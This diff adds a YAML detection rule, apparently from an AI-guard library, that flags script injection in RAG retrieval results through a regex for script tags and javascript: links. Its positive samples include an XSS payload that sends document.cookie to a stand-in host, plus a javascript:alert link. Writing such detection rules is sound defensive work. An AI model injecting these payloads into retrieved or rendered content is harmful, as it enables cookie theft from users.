@@ -1,0 +1,36 @@
+# AIGuardFabric 检测规则 —— 检索内容中的脚本注入
+# 安全域: rag-poison（RAG 投毒）｜ 检测目标: tool-result ｜ 算子: regex ｜ 等级: high
+# 正负样本内联在 samples.positive / samples.negative：正样本必须命中、负样本必须不命中，
+# 该约束由 crates/agf-scan/tests/rules_library.rs 强制（含内置负样本基线）。
+# 参考: https://genai.owasp.org/llm-top-10/
+key: RP-DOC-008
+name: 检索内容中的脚本注入
+description: 'RAG 结果会被渲染到前端或工具链时，<script>/javascript: 属高危载荷。'
+domain: rag-poison
+severity: high
+kind: regex
+target: tool-result
+action: deny
+enabled: true
+rollout_percent: 100
+tags:
+- OWASP-LLM05
+- xss
+- rag
+references:
+- https://genai.owasp.org/llm-top-10/
+detection:
+  type: regex
+  pattern: '(?i)(<script|data:text/html|\]\(\s*javascript:|(?:href|src)\s*=\s*["'']?\s*javascript:)'
+  case_insensitive: true
+  min_matches: 1
+samples:
+  positive:
+  - 文档摘要：<script>fetch('https://evil.invalid/c?d='+document.cookie)</script>
+  - 参考链接：[点我](javascript:alert(document.domain))
+  negative:
+  - 文档中包含 script 标签示例，在 Markdown 里已被转义为 &lt;script&gt;。
+  - '前端渲染 Markdown 时必须过滤 javascript: 协议（安全规范第 5 条）。'
+remediation: 检索结果输出前统一做 HTML 转义与协议白名单；禁止把原文当富文本渲染。
+author: agf-rules
+version: 1
